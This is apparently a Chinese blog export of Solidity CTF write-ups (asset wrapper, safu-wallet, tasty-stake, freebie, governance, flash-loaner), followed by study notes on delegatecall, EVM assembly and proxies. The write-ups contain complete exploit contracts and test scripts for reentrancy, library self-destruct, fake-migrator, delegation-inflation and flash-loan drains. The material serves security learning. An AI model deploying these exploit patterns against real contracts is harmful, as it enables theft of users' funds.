Counters.Counter private _tokenId;    /// @dev allows whitelisting of GameAsset contracts    mapping(address =&gt; bool) private _whitelist;    /// @dev token ID for each whitelisted GameAsset contract    mapping(address =&gt; uint256) private _assetId;    constructor(        string memory uri    ) AssetHolder (        uri    ) &#123;&#125;    /// @dev owner can whitelist GameAsset ERC721 contracts    /// @dev a GameAsset contract cannot be removed from the WL    function updateWhitelist(address asset) external onlyOwner &#123;        if (!_whitelist[asset]) &#123;            _assetId[asset]=_tokenId.current();            _whitelist[asset] = true;            _tokenId.increment();        &#125;    &#125;    /// @dev returns whether an asset is whitelisted    function isWhitelisted(address asset) public view returns (bool) &#123;        return _whitelist[asset];    &#125;    /// @dev wraps arbitrary whitelisted ERC721 game assets    /// @param nftId Unique id of the asset the user is wrapping    /// @param assetOwner Address of owner to assign this game asset    /// @param assetAddress Address of the GameAsset contract    function wrap(        uint256 nftId,        address assetOwner,        address assetAddress    ) public &#123;        require(isWhitelisted(assetAddress), &quot;Wrapper: asset not whitelisted&quot;);        _wrap(assetOwner, assetAddress, nftId);        IGameAsset asset = IGameAsset(assetAddress);        address owner = asset.ownerOf(nftId);        // can be removed to allow wrapping to any account, saving gas on transfer        require(assetOwner == owner, &quot;Wrapper: incorrect receiver for wrap&quot;);        require(            owner == msg.sender ||                isApprovedForAll(owner, msg.sender) || // approval for all WLed contracts                asset.isApprovedForAll(owner, msg.sender), // approval for this WL contract            &quot;Wrapper: asset is not owned by sender&quot;        );        asset.setOwnerOperator( // wrapper takes control of asset            address(this),            nftId        );    &#125;    /// @dev unwraps assets and transfers NFT back to user `assetOwner`    /// @dev per game mechanics user has max of one wrapped NFT per token ID    function unwrap(        address assetOwner,        address assetAddress    ) public &#123;        require(isWhitelisted(assetAddress), &quot;Wrapper: asset not whitelisted&quot;);        IGameAsset asset = IGameAsset(assetAddress);        require(            assetOwner == msg.sender ||                isApprovedForAll(assetOwner, msg.sender) || // approval for all WLed contracts                asset.isApprovedForAll(assetOwner, msg.sender), // approval for this WL contract            &quot;Wrapper: asset if not owned by sender&quot;        );        _unwrap(assetOwner, assetAddress);    &#125;    function _wrap(        address assetOwner,        address assetAddress,        uint256 nftId    ) private &#123;        uint256 assetId = _assetId[assetAddress];        bytes memory data = abi.encode(nftId);        _mint(assetOwner, assetId, 1, data);    &#125;    function _unwrap(        address assetOwner,        address assetAddress    ) private &#123;        uint256 assetId = _assetId[assetAddress];        uint256 nftId = getIdOwned(assetId, assetOwner); // NFT id owned by user        _burn(assetOwner, assetId, 1); // reverts if user doesn&#39;t own asset        IGameAsset(assetAddress).setOwnerOperator( // wrapper relinquishes control of asset            assetOwner,            nftId        );    &#125;&#125;</code></pre><p>测试中可以看到  </p><pre><code>await assetWrapper.connect(admin).updateWhitelist(swordAsset.address)await assetWrapper.connect(admin).updateWhitelist(shieldAsset.address)// set the operator of the two game assets to be the wrapper contractawait swordAsset.connect(admin).setOperator(assetWrapper.address)await shieldAsset.connect(admin).setOperator(assetWrapper.address)// adminUser is the user you will be griefing// minting 1 SWORD &amp; 1 SHIELD asset for adminUserawait swordAsset.connect(admin).mintForUser(await adminUser.getAddress(),1)await shieldAsset.connect(admin).mintForUser(await adminUser.getAddress(),1)</code></pre><p>swordAsset和shieldAsset为包装合约（assetWrapper）设置了operator<br>这使assetWrapper可以通过setOwnerOperator（）不经过主人的同意就转走他的nft<br>看assetWrapper的warp函数 它可以经过nft主人同意把nft转给本合约 然后为主人铸造assetWrapper代币<br>当需要取走时 调用unwarp函数 销毁assetWrapper代币并把nft再转给主人<br>合约的漏洞在于warp函数  </p><pre><code>function wrap(            uint256 nftId,            address assetOwner,            address assetAddress        ) public &#123;            require(isWhitelisted(assetAddress), &quot;Wrapper: asset not whitelisted&quot;);            _wrap(assetOwner, assetAddress, nftId);            IGameAsset asset = IGameAsset(assetAddress);            address owner = asset.ownerOf(nftId);            // can be removed to allow wrapping to any account, saving gas on transfer            require(assetOwner == owner, &quot;Wrapper: incorrect receiver for wrap&quot;);            require(                owner == msg.sender ||                    isApprovedForAll(owner, msg.sender) || // approval for all WLed contracts                    asset.isApprovedForAll(owner, msg.sender), // approval for this WL contract                &quot;Wrapper: asset is not owned by sender&quot;            );            asset.setOwnerOperator( // wrapper takes control of asset                address(this),                nftId            );        &#125;</code></pre><p>可以看到warp函数先为请求者铸造代币  然后在对主人是否授权进行验证，这明显不合理<br>可以看到在铸币完成后会触发安全检验<br>   _doSafeBatchTransferAcceptanceCheck(operator, address(0), to, ids, amounts, data);</p><pre><code>function _doSafeTransferAcceptanceCheck(        address operator,        address from,        address to,        uint256 id,        uint256 amount,        bytes memory data    ) private &#123;        if (to.isContract()) &#123;            try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response) &#123;                if (response != IERC1155Receiver.onERC1155Received.selector) &#123;                    revert(&quot;ERC1155: ERC1155Receiver rejected tokens&quot;);                &#125;            &#125; catch Error(string memory reason) &#123;                revert(reason);            &#125; catch &#123;                revert(&quot;ERC1155: transfer to non ERC1155Receiver implementer&quot;);            &#125;        &#125;    &#125;</code></pre><p>会触发铸造者的onERC1155Received函数<br>而如果我们在这个函数中进行unwarp 这时因为在铸币过程中assetWrapper合约记录的nft主人是我们自己的合约 _ownsAny[id][to]也会变为true 所以可以通过验证  assetWrapper合约会把nft发给我们的攻击账户  我们的攻击账户成了nft的主人 自然可以通过warp的剩下逻辑 交易会成功 我们获得了nft  </p><p>攻击合约  </p><pre><code>    //SPDX-License-Identifier: MIT    pragma solidity ^0.8.4;    import &quot;@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol&quot;;    interface AssertWrap&#123;        function wrap(            uint256 nftId,            address assetOwner,            address assetAddress        ) external;        function unwrap(            address assetOwner,            address assetAddress        ) external;    &#125;    contract AssertAttack&#123;        address assertWarp;        address nft1;        address nft2;        int count = 0 ;        constructor(address _warp,address token1,address token2) public&#123;            assertWarp = _warp;            nft1 = token1;            nft2 = token2;        &#125;        function attack() public &#123;            AssertWrap(assertWarp).wrap(0,address(this),nft1);            AssertWrap(assertWarp).wrap(0,address(this),nft2);        &#125;        function onERC1155Received(            address operator,            address from,            uint256 id,            uint256 value,            bytes calldata data        ) external returns (bytes4)&#123;            if(count == 0)&#123;            AssertWrap(assertWarp).unwrap(address(this), nft1);            count++;            return IERC1155Receiver.onERC1155Received.selector;&#125;            AssertWrap(assertWarp).unwrap(address(this), nft2);            return IERC1155Receiver.onERC1155Received.selector;        &#125;    &#125;</code></pre><p>测试</p><pre><code>    it(&quot;solves the challenge&quot;, async function () &#123;    let AssertAttackFactory = await ethers.getContractFactory(&#39;AssertAttack&#39;);    let AssertAttack = await AssertAttackFactory.deploy(assetWrapper.address,swordAsset.address,shieldAsset.address)    await AssertAttack.attack();    &#125;);</code></pre><p><img src="3.png" alt="2"></p><h2 id="safu-wallet"><a href="#safu-wallet" class="headerlink" title="safu-wallet"></a>safu-wallet</h2><p>题目要求admin向wallet发送交易时被回退  也就是钱包的功能被瘫痪<br>观察测试时可以知道wallet的部署方式时代理<br>SafuWallet合约是代理合约 SafuWalletLibrary为逻辑合约  </p><p>SafuWallet合约部署时会调用初始化函数  但是改变的只是代理合约的状态变量  也就是逻辑合约（SafuWalletLibrary）的状态未发生改变</p><p>可以看到逻辑合约中有一个自毁函数 那么我们就可以对逻辑进行初始化，然后再自毁来瘫痪钱包功能</p><p>it(“solves the challenge”, async function () {<br>    await safuWalletLibrary.connect(attacker).initWallet([],0,ethers.0);<br>    await safuWalletLibrary.connect(attacker).kill(await attacker.getAddress());<br>});</p><h2 id="tasty-stake"><a href="#tasty-stake" class="headerlink" title="tasty-stake"></a>tasty-stake</h2><p>实验室已经发布了他们的 TastyStakes合约，该合约允许您质押stake以获得 BUTTER 代币。<br>您的任务是从质押合约中耗尽所有 STEAK 代币。</p><p>  await steak.connect(admin).mintPerUser( // attacker gets 1 steak<br>    [await adminUser.getAddress(), await attacker.getAddress()],<br>    [precision.mul(100_000), precision.mul(1)]<br>  )</p><p>attacker初始拥有1eth的steak代币</p><p>发现TastyStaking中有这样一个功能，把旧TastyStaking合约中的staking和reward代币转移到本合约上。</p><pre><code>function migrateStake(address oldStaking, uint256 amount) external &#123;        TastyStaking(oldStaking).migrateWithdraw(msg.sender, amount);        _applyStake(msg.sender, amount);    &#125;function migrateWithdraw(address staker, uint256 amount) external onlyMigrator &#123;    _withdrawFor(staker, msg.sender, amount, true, staker);&#125;function _applyStake(address _for, uint256 _amount) internal updateReward(_for) &#123;    _totalSupply += _amount;    _balances[_for] += _amount;    emit Staked(_for, _amount);&#125;</code></pre><p>但他未对旧合约的地址进行严格的审查  这就导致我们可以随便创建一个外部合约，实现migrateWithdraw接口，然后就可以随意增加我们的余额<br>    pragma solidity ^0.8.4;</p><pre><code>contract TastyStakeAttack &#123;    function migrateWithdraw(address staker, uint256 amount) external &#123;    &#125;&#125;it(&quot;solves the challenge&quot;, async function () &#123;    let TastyStakeAttack = await (await ethers.getContractFactory(&#39;TastyStakeAttack&#39;)).deploy();    await tastyStaking.connect(attacker).migrateStake(TastyStakeAttack.address,precision.mul(100_000))    await tastyStaking.connect(attacker).withdrawAll(false);&#125;);</code></pre><h2 id="freebie"><a href="#freebie" class="headerlink" title="freebie"></a>freebie</h2><p>有一个质押合约RewardsAdvisor，它接受FARM代币并铸造等量的xFARM<br>您的任务是从此合约中抽空 99.99%+ 的 FARM 代币。</p><p>观察合约中的deposit函数    </p><pre><code>function deposit(    uint256 farmDeposit,    address payable from,    address to) external returns (uint256 shares) &#123;    require(farmDeposit &gt; 0, &quot;deposits must be nonzero&quot;);    require(to != address(0) &amp;&amp; to != address(this), &quot;to&quot;);    require(from != address(0) &amp;&amp; from != address(this), &quot;from&quot;);    shares = farmDeposit;    if (xfarm.totalSupply() != 0) &#123;        uint256 farmBalance = farm.balanceOf(address(this));        shares = (shares * xfarm.totalSupply()) / farmBalance;    &#125;    if (isContract(from)) &#123;        require(IAdvisor(from).owner() == msg.sender); // admin        IAdvisor(from).delegatedTransferERC20(address(farm), address(this), farmDeposit);    &#125; else &#123;        require(from == msg.sender); // user        farm.safeTransferFrom(from, address(this), farmDeposit);    &#125;    xfarm.mint(to, shares);&#125;</code></pre><p>发现deposit函数没有对合约自身的token余额是否增加进行检查</p><pre><code>//SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract RewardAdvisorAttack&#123;    address public owner1;    constructor(address add) public&#123;        owner = add;    &#125;    function delegatedTransferERC20(address token, address to, uint256 amount) external&#123;    &#125;    function owner() external returns (address)&#123;        return owner1;    &#125;&#125;it(&quot;solves the challenge&quot;, async function () &#123;    let attackContract = await (await ethers.getContractFactory(&quot;RewardAdvisorAttack&quot;,attacker)).deploy(await attacker.getAddress());    await rewardsAdvisor.connect(attacker).deposit(precision.mul(1_000_000_000),attackContract.address,await attacker.getAddress());    await rewardsAdvisor.connect(attacker).withdraw(precision.mul(1_000_000_000),await attacker.getAddress(),await attacker.getAddress());&#125;);</code></pre><h2 id="nft-bonanza"><a href="#nft-bonanza" class="headerlink" title="nft-bonanza"></a>nft-bonanza</h2><p>新的 NFT 交易所合约 BonanzaMarketplace 已经推出，允许交易选定的白名单 ERC721 和 ERC1155 代币。<br>您的挑战是滑动所有列出的 NFT。</p><h2 id="governance-shenanigans"><a href="#governance-shenanigans" class="headerlink" title="governance-shenanigans"></a>governance-shenanigans</h2><p>观察合约 发现_moveDelegates函数在srcRep和dstRep相等时和amount&gt;0时不会进行任何操作，并且整个delegate操作后token还在delegator手中。一共有三个可用账户，那么一个账户给attacker进行delegate后，可以将token转走然后将本地址的delegatee清零，这样就可以在钱转回来时重新为attacker进行delegate。</p><p>解决方案<br>it(“solves the challenge”, async function () {</p><p>  await governanceToken.connect(attacker).transfer(await o1.getAddress(), precision.mul(500))<br>  expect(await governanceToken.balanceOf(await o1.getAddress())).to.be.eq(precision.mul(500))<br>  console.log(“transfer success”)<br>  await governanceToken.connect(o1).delegate(await attacker.getAddress())<br>  expect(await governanceToken.getCurrentVotes(await attacker.getAddress())).to.be.eq(precision.mul(500))<br>  console.log(“o1 delegate attack success 1”)</p><p>  await governanceToken.connect(o1).transfer(await o2.getAddress(), precision.mul(500))<br>  expect(await governanceToken.balanceOf(await o2.getAddress())).to.be.eq(precision.mul(500))<br>  console.log(“transfer success”)<br>  await governanceToken.connect(o2).delegate(await attacker.getAddress())<br>  expect(await governanceToken.getCurrentVotes(await attacker.getAddress())).to.be.eq(precision.mul(1000))<br>  console.log(“o2 delegate attack success 2”)</p><p>  await governanceToken.connect(o1).delegate(“0x0000000000000000000000000000000000000000”);<br>  await governanceToken.connect(o2).transfer(await o1.getAddress(), precision.mul(500))<br>  await governanceToken.connect(o1).delegate(await attacker.getAddress())<br>  expect(await governanceToken.getCurrentVotes(await attacker.getAddress())).to.be.eq(precision.mul(1500))<br>  console.log(“o1 delegate attack success 3”)</p><p>  await governanceToken.connect(o2).delegate(“0x0000000000000000000000000000000000000000”);<br>  await governanceToken.connect(o1).transfer(await o2.getAddress(), precision.mul(500))<br>  await governanceToken.connect(o2).delegate(await attacker.getAddress())<br>  expect(await governanceToken.getCurrentVotes(await attacker.getAddress())).to.be.eq(precision.mul(2000))<br>  console.log(“o2 delegate attack success 4”)</p><p>  await governanceToken.connect(o1).delegate(“0x0000000000000000000000000000000000000000”);<br>  await governanceToken.connect(o2).transfer(await o1.getAddress(), precision.mul(500))<br>  await governanceToken.connect(o1).delegate(await attacker.getAddress())<br>  expect(await governanceToken.getCurrentVotes(await attacker.getAddress())).to.be.eq(precision.mul(2500))<br>  console.log(“o1 delegate attack success 4”)</p><p>});</p><h2 id="flash-loaner"><a href="#flash-loaner" class="headerlink" title="flash-loaner"></a>flash-loaner</h2><p>闪贷合同接受用户的资金，以促进闪贷，他们收取少量费用。这笔费用作为收益提供给存款人。</p><p>您的任务是从该合同中抽取 99%+ 的用户资金。你从没有资金开始。</p><p>本题中提供闪贷的是usdc代币  而闪贷合约本身是一个erc4626<br>闪贷前后检查的是本地址的usdc代币余额 而deposit会将调用者的usdc转入本地址，并且铸造erc4626<br>那么闪贷出来的钱用于deposit 那么我们只需要额外付一些闪贷费用 就可以铸造很多erc4626<br>那么闪贷费用向哪里找？<br>题目中还提供了一个usdc和dai代币的UniswapV2交易对，提供swap（闪贷）功能，那么我们先用swap贷出flash费用，然后利用上述方法铸造erc4626，<br>之后将erc4626 withdraw得到闪贷池巨额usdc，分出一部分来偿还swap费用和本金<br>攻击合约  </p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol&quot;;//import &quot;@nomiclabs/buidler/console.sol&quot;;interface Iflashloaner &#123;    function flash(        address recipient,        uint256 amount,        bytes calldata data    ) external;    function convertToAssets(        uint256 shares    ) external view returns (uint256 assets);    function deposit(        uint256 assets,        address receiver    ) external returns (uint256);    function withdraw(        uint256 assets,        address receiver,        address owner    ) external returns (uint256);    function previewDeposit(uint256 assets) external returns (uint256);    function maxWithdraw(address owner) external returns (uint256);&#125;interface UniV2Swap &#123;    function getAmountIn(        uint256 amountOut,        uint256 reserveIn,        uint256 reserveOut    ) external pure returns (uint256 amountIn);    function swap(        uint256 amount0Out,        uint256 amount1Out,        address to,        bytes calldata data    ) external;&#125;interface token &#123;    function transfer(address to, uint amount) external;    function approve(address spender, uint256 amount) external returns (bool);&#125;contract flashLoanerExploiter &#123;    using Math for uint256;    Iflashloaner loner;    UniV2Swap swaper;    UniV2Swap router;    token Token;    uint256 public feeBasis = 100;    uint256 public constant feeMax = 10_000; // basis points    uint flashamount;    uint swapFee;    constructor(address _loner, address _swaper, address _token) public &#123;        loner = Iflashloaner(_loner);        swaper = UniV2Swap(_swaper);        Token = token(_token);    &#125;    function Swap(uint amount) public payable &#123;        swaper.swap(amount, 0, address(this), &quot;12&quot;);    &#125;    function setSwapFee(uint amount) public payable &#123;        swapFee = amount;    &#125;    function Setflash(uint amount) public payable &#123;        flashamount = amount;    &#125;    function flashCallback(uint256 fee, bytes calldata data) external &#123;        Token.approve(address(loner), flashamount);        loner.deposit(flashamount, address(this));        Token.transfer(address(loner), fee);    &#125;    function uniswapV2Call(        address spender,        uint amount1Out,        uint amount2Out,        bytes memory data    ) external &#123;        loner.flash(address(this), flashamount, &quot;&quot;);        uint shares = loner.maxWithdraw(address(this));        uint assert = loner.withdraw(shares, address(this), address(this));        Token.transfer(address(swaper), 1004 * 10 ** 18);    &#125;    function finish(address add, uint amount) public &#123;        Token.transfer(add, amount);    &#125;&#125;</code></pre><p>测试部分</p><pre><code>it(&quot;solves the challenge&quot;, async function () &#123;    let pairAddress = await uniFactory.getPair(usdc.address, dai.address)    let flashLonerExploiterFactory = await ethers.getContractFactory(&#39;flashLoanerExploiter&#39;);    let flashLonerExploiter = await flashLonerExploiterFactory.deploy(flashLoaner.address, pairAddress, usdc.address);    await flashLonerExploiter.setSwapFee(await uniRouter.getAmountIn(precision.mul(1_000), precision.mul(1_000_000), precision.mul(1_000_000)));    await flashLonerExploiter.Setflash(precision.mul(99_999));    await flashLonerExploiter.Swap(precision.mul(1_000));    let amount = await usdc.balanceOf(flashLonerExploiter.address);    console.log(&quot;Contract Balances:&quot; + amount);    await flashLonerExploiter.finish(await attacker.getAddress(), amount);&#125;);</code></pre>]]></content>
      
      
      <categories>
          
          <category> solidity learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>知识点</title>
      <link href="/2022/11/26/knowledge/"/>
      <url>/2022/11/26/knowledge/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><hr><h2 id="合同间的调用函数"><a href="#合同间的调用函数" class="headerlink" title="合同间的调用函数"></a>合同间的调用函数</h2><h3 id="call-delegatecall-callcode区别"><a href="#call-delegatecall-callcode区别" class="headerlink" title="call||delegatecall||callcode区别"></a>call||delegatecall||callcode区别</h3><p><strong>call</strong>：调用后内置变量msg的值会修改为调用者 执行环境为<em>被调用者</em>的环境<br>A调B B委托调C 此时msg.sender为B<br><strong>地址.call{value：}（bytes（keccak256（函数标识符）））</strong></p><p><strong>delegatecall</strong>： 调用后内置变量msg的值<em>不会</em>改为调用者 执行环境为<em>调用者</em> 的运行环境<br>如A调B B委托调用C 此时msg.sender为A</p><p><strong>callcode</strong>： 调用后内置变量msg的值会改为调用者，但执行环境为<em>调用者</em>的运行环境</p><hr><h2 id="通过selfdestruct发送ETH到不可接收合约"><a href="#通过selfdestruct发送ETH到不可接收合约" class="headerlink" title="通过selfdestruct发送ETH到不可接收合约"></a>通过selfdestruct发送ETH到不可接收合约</h2><p>合约自毁，把合约剩余balancs转到指定地址 不管有没有payable<br>selfdestruct(payable(address))</p><hr><h2 id="msg-sender-与tx-origin"><a href="#msg-sender-与tx-origin" class="headerlink" title="msg.sender 与tx.origin"></a>msg.sender 与tx.origin</h2><p> msg.sender为函数直接调用方  tx.origin是交易原始发起方<br> 如用户通过合约A调用合约B<br> 对于合约A tx.origin和msg.sender均为用户<br> 对于合约B tx.origin为用户 msg.sender为合约A</p><hr><p>private属性的数据在可以通过外部访问<br>web3.eth.getStorageAt（’合约地址’，序号）；</p><hr><p> extcodesize（地址）<br> 用来检查是用户地址还是合约地址<br> 如果extcodesize为0 则为用户地址</p><p> 隐患  当合约未创建时 代码长度检测为零 所以如果把攻击函数写在构造函数中，就可以绕过认证</p><hr><p>bytes uint 转换<br>bytes8 bytes32都是定长字节组 他们转换为16进制储存 位数为16 ，64… （一个字节（十六进制）两位）<br>bytes8转换可转换为uint64  bytes32 转换为uint256</p><hr><h1 id="solidity中的内联汇编"><a href="#solidity中的内联汇编" class="headerlink" title="solidity中的内联汇编"></a>solidity中的内联汇编</h1><p>汇编：可用汇编器转换为机器代码的低级编程语言。<br>操作码：为了解决实际问题，基于栈结构机器需要实现一些额外的指令，执行指令时先从堆栈弹出一个或多个值作为参数，再将执行结果压回堆栈</p><h2 id="为什么solidity要使用汇编？"><a href="#为什么solidity要使用汇编？" class="headerlink" title="为什么solidity要使用汇编？"></a>为什么solidity要使用汇编？</h2><p>1.可以直接用操作码与EVM交互 对操作进行更加精准的操控<br>2.更少的gas消耗<br>3.更强的功能</p><h2 id="solidity中两种类型的汇编："><a href="#solidity中两种类型的汇编：" class="headerlink" title="solidity中两种类型的汇编："></a>solidity中两种类型的汇编：</h2><p>1.内联汇编2.独立汇编</p><h2 id="基本汇编语法"><a href="#基本汇编语法" class="headerlink" title="基本汇编语法"></a>基本汇编语法</h2><p><strong>引入汇编</strong><br>assembly{</p><p>}<br><em>用assembly嵌入汇编代码块</em><br><strong>注</strong>：汇编代码块之间不能通信 一个代码块里的的变量，在另一个汇编语言中不可以访问<br>例子：</p><pre><code>function addition（uint x, uint y）public pure returns(uint)&#123;    assemble&#123;        //创建一个变量result        //-&gt;使用add操作码计算x+y        //-&gt;将计算结果赋值给result        let result := add(x,y) //x+y        //使用mstore操作码        // -&gt; result变量的值存入内存        // -&gt; 指定内存地址0x0        mstore(0x0,result)        //结果存入内存        //从内存地址返回0x返回32字节        return(0x0, 32)        &#125;&#125;</code></pre><h2 id="solidity汇编中变量的定义与赋值"><a href="#solidity汇编中变量的定义与赋值" class="headerlink" title="solidity汇编中变量的定义与赋值"></a>solidity汇编中变量的定义与赋值</h2><p>let关键字定义<br>：=赋值<br>assembly{<br>    let x ：= 2<br>}<br>如不赋值初始化为0；</p><p><em>let运行机制</em><br>创建一个新的堆栈槽位<br>为变量保持槽位<br>代码块结束自动销毁该槽位</p><h4 id="汇编的注释"><a href="#汇编的注释" class="headerlink" title="汇编的注释"></a>汇编的注释</h4><p>//<br>/<em> </em>/</p><h4 id="块与作用域"><a href="#块与作用域" class="headerlink" title="块与作用域"></a>块与作用域</h4><p>一个块的范围使用一对大括号标识</p><h3 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h3><p>assembly{</p><pre><code>for&#123; let i := 0 &#125;//初始化 lt(i,n)//执行条件 &#123; i := add(i,1) &#125;&#123;    value := mul(2, value)&#125;mstore(0x0, value)return(0x0, 32)</code></pre><p>}</p><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>assemble {<br>    let x := 0;<br>    let i := 0;<br>    for {} lt(i,0x100){ }{<br>        x:=add(x,mload(i))<br>        i:=add(i,0x20)<br>    }<br>}</p><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><p>assemble{<br>    if slt(x,0) { x := sub( 0, x) }<br>    if eq{value, 0} revert(0,0)<br>    //无else<br>}</p><h2 id="汇编的函数"><a href="#汇编的函数" class="headerlink" title="汇编的函数"></a>汇编的函数</h2><h2 id="操作码"><a href="#操作码" class="headerlink" title="操作码"></a>操作码</h2><p>stop()    -                                                F    stop execution, identical to return(0, 0)<br>add(x, y)                                                 F    x + y<br>sub(x, y)                                                 F    x - y<br>mul(x, y)                                                 F    x <em> y<br>div(x, y)                                                 F    x / y or 0 if y == 0<br>sdiv(x, y)                                                 F    x / y, for signed numbers in two’s complement, 0 if y == 0<br>mod(x, y)                                                 F    x % y, 0 if y == 0<br>smod(x, y)                                                 F    x % y, for signed numbers in two’s complement, 0 if y == 0<br>exp(x, y)                                                 F    x to the power of y<br>not(x)                                                     F    bitwise “not” of x (every bit of x is negated)<br>lt(x, y)                                                 F    1 if x &lt; y, 0 otherwise<br>gt(x, y)                                                 F    1 if x &gt; y, 0 otherwise<br>slt(x, y)                                                 F    1 if x &lt; y, 0 otherwise, for signed numbers in two’s complement<br>sgt(x, y)                                                 F    1 if x &gt; y, 0 otherwise, for signed numbers in two’s complement<br>eq(x, y)                                                 F    1 if x == y, 0 otherwise<br>iszero(x)                                                 F    1 if x == 0, 0 otherwise<br>and(x, y)                                                 F    bitwise “and” of x and y<br>or(x, y)                                                 F    bitwise “or” of x and y<br>xor(x, y)                                                 F    bitwise “xor” of x and y<br>byte(n, x)                                                 F    nth byte of x, where the most significant byte is the 0th byte<br>shl(x, y)                                                 C    logical shift left y by x bits<br>shr(x, y)                                                 C    logical shift right y by x bits<br>sar(x, y)                                                 C    signed arithmetic shift right y by x bits<br>addmod(x, y, m)                                             F    (x + y) % m with arbitrary precision arithmetic, 0 if m == 0<br>mulmod(x, y, m)                                             F    (x </em> y) % m with arbitrary precision arithmetic, 0 if m == 0<br>signextend(i, x)                                         F    sign extend from (i*8+7)th bit counting from least significant<br>keccak256(p, n)                                             F    keccak(mem[p…(p+n)))<br>pc()                                                     F    current position in code<br>pop(x)    -                                                F    discard value x<br>mload(p)                                                 F    mem[p…(p+32))<br>mstore(p, v)    -                                        F    mem[p…(p+32)) := v<br>mstore8(p, v)    -                                        F    mem[p] := v &amp; 0xff (only modifies a single byte)<br>sload(p)                                                 F    storage[p]<br>sstore(p, v)    -                                        F    storage[p] := v<br>msize()                                                     F    size of memory, i.e. largest accessed memory index<br>gas()                                                     F    gas still available to execution<br>address()                                                 F    address of the current contract / execution context<br>balance(a)                                                 F    wei balance at address a<br>selfbalance()                                             I    equivalent to balance(address()), but cheaper<br>caller()                                                 F    call sender (excluding delegatecall)<br>callvalue()                                                 F    wei sent together with the current call<br>calldataload(p)                                             F    call data starting from position p (32 bytes)<br>calldatasize()                                             F    size of call data in bytes<br>calldatacopy(t, f, s)                                    F    copy s bytes from calldata at position f to mem at position t<br>codesize()                                                 F    size of the code of the current contract / execution context<br>codecopy(t, f, s)    -                                    F    copy s bytes from code at position f to mem at position t<br>extcodesize(a)                                             F    size of the code at address a<br>extcodecopy(a, t, f, s)    -                                F    like codecopy(t, f, s) but take code at address a<br>returndatasize()                                         B    size of the last returndata<br>returndatacopy(t, f, s)    -                                B    copy s bytes from returndata at position f to mem at position t<br>extcodehash(a)                                             C    code hash of address a<br>create(v, p, n)                                             F    create new contract with code mem[p…(p+n)) and send v wei and return the new address<br>create2(v, p, n, s)                                         C    create new contract with code mem[p…(p+n)) at address keccak256(0xff . this . s . keccak256(mem[p…(p+n))) and send v wei and         return the new address, where 0xff is a 1 byte value, this is the current contract’s address as a 20 byte value and s is a big-endian 256-bit value<br>call(g, a, v, in, insize, out, outsize)                     F    call contract at address a with input mem[in…(in+insize)) providing g gas and v wei and output area mem[out…(out+outsize)) returning 0 on error (eg. out of gas) and 1 on success<br>callcode(g, a, v, in, insize, out, outsize)                 F    identical to call but only use the code from a and stay in the context of the current contract otherwise<br>delegatecall(g, a, in, insize, out, outsize)             H    identical to callcode but also keep caller and callvalue<br>staticcall(g, a, in, insize, out, outsize)                 B    identical to call(g, a, 0, in, insize, out, outsize) but do not allow state modifications<br>return(p, s)    -                                        F    end execution, return data mem[p…(p+s))<br>revert(p, s)    -                                        B    end execution, revert state changes, return data mem[p…(p+s))<br>selfdestruct(a)    -                                        F    end execution, destroy current contract and send funds to a<br>invalid()    -                                            F    end execution with invalid instruction<br>log0(p, s)    -                                            F    log without topics and data mem[p…(p+s))<br>log1(p, s, t1)    -                                        F    log with topic t1 and data mem[p…(p+s))<br>log2(p, s, t1, t2)    -                                    F    log with topics t1, t2 and data mem[p…(p+s))<br>log3(p, s, t1, t2, t3)    -                                F    log with topics t1, t2, t3 and data mem[p…(p+s))<br>log4(p, s, t1, t2, t3, t4)    -                            F    log with topics t1, t2, t3, t4 and data mem[p…(p+s))<br>chainid()                                                 I    ID of the executing chain (EIP 1344)<br>origin()                                                 F    transaction sender<br>gasprice()                                                 F    gas price of the transaction<br>blockhash(b)                                             F    hash of block nr b - only for last 256 blocks excluding current<br>coinbase()                                                 F    current mining beneficiary<br>timestamp()                                                 F    timestamp of the current block in seconds since the epoch<br>number()                                                 F    current block number<br>difficulty()                                             F    difficulty of the current block<br>gaslimit()                                                 F    block gas limit of the current block</p><hr><p>delegatecall 调用其他合约函数 如果改变变量 改变的其实是调用合约 相应插槽的值 而不是被调用合约的值</p><hr><p>Storage</p>]]></content>
      
      
      <categories>
          
          <category> solidity learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>proxy</title>
      <link href="/2022/11/26/proxy/"/>
      <url>/2022/11/26/proxy/</url>
      
        <content type="html"><![CDATA[<h1 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h1><hr><p>代理将数据和逻辑分开，分别保存在不同合约中，代理合约和逻辑合约</p><p>对外暴露的是代理合约的地址，用户在进行交互是实际在于代理合约交互，代理合约把数据传给逻辑合约，逻辑合约执行后返回给代理合约，代理合约进一步返回给用户。<br>此方式可以对逻辑合约进行升级，只需把代理合约指向的目标合约进行替换。</p><p>代理合约的实现需要solidity内联汇编，开发者需要熟悉每个步骤的含义<br>代理合约如何实现逻辑合约的函数调用？<br>主要是回调函数，当调用合约中不存在的函数会触发合约中的回调函数，回调函数中将calldata储存并用delegatecall调用目标合约<br>比如</p><pre><code>fallback() external payable &#123;address _implementation = implementation;    assembly &#123;        // 将msg.data拷贝到内存里        // calldatacopy操作码的参数: 内存起始位置，calldata起始位置，calldata长度        calldatacopy(0, 0, calldatasize())        // 利用delegatecall调用implementation合约        // delegatecall操作码的参数：gas, 目标合约地址，input mem起始位置，input mem长度，output area mem起始位置，output area mem长度        // output area起始位置和长度位置，所以设为0        // delegatecall成功返回1，失败返回0        let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0)        // 将return data拷贝到内存        // returndata操作码的参数：内存起始位置，returndata起始位置，returndata长度        returndatacopy(0, 0, returndatasize())        switch result        // 如果delegate call失败，revert        case 0 &#123;            revert(0, returndatasize())        &#125;        // 如果delegate 